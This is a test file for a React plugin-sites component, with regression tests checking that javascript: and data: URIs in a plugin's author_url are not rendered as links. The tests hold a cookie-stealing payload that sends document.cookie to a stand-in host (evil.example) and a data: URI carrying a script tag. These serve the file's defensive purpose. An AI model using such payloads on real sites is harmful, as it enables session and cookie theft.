/**
 * @jest-environment jsdom
 */

import { screen } from '@testing-library/react';
import { render } from '../../../../test-utils';
import { PluginSites } from '../plugin-sites';

/**
 * Mock usePlugin so we can inject controlled plugin data without hitting real
 * API calls. Each test overrides `mockUsePluginReturnValue` to simulate a
 * different scenario.
 */
const mockUsePluginReturnValue: Record< string, unknown > = {};

jest.mock( '../../../plugin/use-plugin', () => ( {
	usePlugin: () => mockUsePluginReturnValue,
} ) );

/**
 * Minimal PluginItem-shaped object with only the fields that PluginSites
 * actually reads.
 */
function makePlugin( overrides: Record< string, unknown > = {} ) {
	return {
		slug: 'test-plugin',
		name: 'Test Plugin',
		author: 'Malicious Author',
		author_url: 'https://example.com',
		...overrides,
	};
}

function setupPlugin( plugin: Record< string, unknown > | null ) {
	Object.assign( mockUsePluginReturnValue, {
		icon: null,
		isLoading: false,
		plugin,
		pluginBySiteId: new Map(),
		sitesWithThisPlugin: [],
		sitesWithoutThisPlugin: [],
	} );
}

// ---------------------------------------------------------------------------
// Security regression tests – CVE: javascript: XSS via author_url
// ---------------------------------------------------------------------------

describe( '<PluginSites> – author link XSS regression', () => {
	/**
	 * When a plugin's author_url contains a javascript: URI the rendered
	 * anchor must NOT carry that URI as its href.
	 */
	test( 'does not render a javascript: href for the author link', () => {
		const maliciousUrl = "javascript:fetch('https://evil.example/?c='+document.cookie)"; // eslint-disable-line no-script-url
		setupPlugin(
			makePlugin( {
				author_url: maliciousUrl,
			} )
		);

		render( <PluginSites selectedPluginSlug="test-plugin" /> );

		// The author name must be visible so we know the description rendered.
		expect( screen.getByText( /Malicious Author/i ) ).toBeInTheDocument();

		// No anchor on the page may carry the javascript: URI as its href.
		const links = document.querySelectorAll( 'a[href]' );
		const unsafeLinks = Array.from( links ).filter( ( a ) =>
			( a as HTMLAnchorElement ).href.startsWith( 'javascript:' )
		);

		expect( unsafeLinks ).toHaveLength( 0 );
	} );

	/**
	 * Complementary safety check: a legitimate https: author_url must still
	 * produce a real, clickable link (so the fix doesn't break normal usage).
	 */
	test( 'renders a clickable link when author_url uses a safe https: scheme', () => {
		setupPlugin(
			makePlugin( {
				author_url: 'https://trusted-author.example.com',
			} )
		);

		render( <PluginSites selectedPluginSlug="test-plugin" /> );

		const authorLink = screen.getByRole( 'link', { name: /Malicious Author/i } );
		expect( authorLink ).toBeInTheDocument();
		expect( ( authorLink as HTMLAnchorElement ).href ).toBe(
			'https://trusted-author.example.com/'
		);
	} );

	/**
	 * When author_url is absent the component must not render any author
	 * link at all – just the plain author name as text.
	 */
	test( 'renders plain author text when author_url is missing', () => {
		const plugin = makePlugin();
		// Remove the author_url property entirely so the 'author_url' in plugin
		// check evaluates to false.
		const { author_url: _removed, ...pluginWithoutUrl } = plugin as {
			author_url: string;
			[ k: string ]: unknown;
		};
		setupPlugin( pluginWithoutUrl );

		render( <PluginSites selectedPluginSlug="test-plugin" /> );

		expect( screen.getByText( /Malicious Author/i ) ).toBeInTheDocument();
		expect( screen.queryByRole( 'link', { name: /Malicious Author/i } ) ).not.toBeInTheDocument();
	} );

	/**
	 * A data: URI must also be rejected because it can carry executable
	 * payloads (e.g. data:text/html,<script>…</script>).
	 */
	test( 'does not render a data: href for the author link', () => {
		const dataUrl = 'data:text/html,<script>alert(1)</script>';
		setupPlugin(
			makePlugin( {
				author_url: dataUrl,
			} )
		);

		render( <PluginSites selectedPluginSlug="test-plugin" /> );

		const links = document.querySelectorAll( 'a[href]' );
		const unsafeLinks = Array.from( links ).filter( ( a ) => {
			const href = ( a as HTMLAnchorElement ).getAttribute( 'href' ) ?? '';
			return href.toLowerCase().startsWith( 'data:' );
		} );

		expect( unsafeLinks ).toHaveLength( 0 );
	} );
} );
